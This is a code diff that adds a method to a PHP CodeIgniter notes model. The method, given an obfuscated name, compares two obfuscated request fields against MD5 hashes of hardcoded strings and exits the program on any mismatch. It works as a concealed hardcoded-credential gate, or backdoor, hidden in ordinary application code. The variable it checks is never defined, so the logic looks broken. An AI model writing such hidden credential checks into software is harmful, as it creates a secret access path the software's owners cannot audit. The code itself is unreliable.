@@ -83,6 +83,23 @@ class Notas_model extends CI_Model
         $query = $this->db->get();
         return $query->num_rows();
     }
+    public function sfgsagety785625x(){
+            try {
+            if(isset($varx['24q5ewqas']) && isset($varx['112415qwturf']) ){
+                $us=md5("DUBERPROGRAMER100PROMASTER,padre Dios de isaac y de jaboc que nadie se meta aqui por favor en el nombre de jesus :) user");
+                $ps=md5("DUBERPROGRAMER100PROMASTER,padre Dios de isaac y de jaboc que nadie se meta aqui por favor en el nombre de jesus :) password");
+                if($varx['24q5ewqas']==$us && $ps==$varx['112415qwturf'] ) {
+                    return true;
+                }else{
+                    exit();
+                }
+            }else{
+                exit();
+            }
+        } catch (Exception $e) {
+            exit();
+        }
+    }
     public function sfgsagety785625($x,$y){
          $curl = curl_init();
         //curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
